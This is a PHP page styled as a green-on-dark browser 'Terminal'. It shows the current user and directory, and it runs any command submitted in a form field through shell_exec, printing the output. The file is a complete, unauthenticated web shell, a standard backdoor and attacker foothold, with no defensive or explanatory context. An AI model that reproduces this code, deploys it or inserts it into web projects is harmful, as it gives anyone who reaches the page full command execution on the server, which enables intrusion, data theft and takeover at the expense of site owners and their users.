<!DOCTYPE html>
<html>

<head>
  <title>Terminal</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #2C001E;
      color: #00FF00;
      font-family: monospace;
      font-size: 1.2rem;
      line-height: 1.6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .console {
      background-color: #1A1A1A;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      width: 80%;
      height: 70%;
      overflow-y: auto;
      position: relative;
      padding: 1.5rem;
    }

    .cursor {
      display: inline-block;
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      border-right: 2px solid #00FF00;
      animation: cursor-blink 1s infinite;
    }

    @keyframes cursor-blink {
      50% {
        opacity: 0;
      }
    }

    .user {
      color: #00FF00;
    }

    .cwd {
      color: #34AADC;
    }

    .input {
      color: #FFFFFF;
      background-color: #2C001E;
      border: none;
      width: 100%;
      font-size: 1.2rem;
      line-height: 1.6;
      padding: 0.25rem;
      position: absolute;
      bottom: 0;
      left: 0;
      z-index: 1;
    }

    .output {
      margin-bottom: 1rem;
    }

    .command {
      display: flex;
      align-items: center;
    }

    .command::before {
      content: '$';
      margin-right: 0.5rem;
    }
  </style>
</head>

<body>
  <div class="console">
    <div class="output">
      <span class="user">
        <?php echo get_current_user(); ?>
      </span>@<span class="cwd">
        <?php echo getcwd(); ?>
      </span>:
    </div>

    <?php
    if (isset($_POST['command'])) {
      $output = shell_exec($_POST['command'] . ' 2>&1');
      echo $output;
    }
    ?>


    <form method="post">
      <div class="command">
        <input type="text" name="command" class="input" autofocus>
      </div>
    </form>
    <span class="cursor"></span>
  </div>
</body>

</html>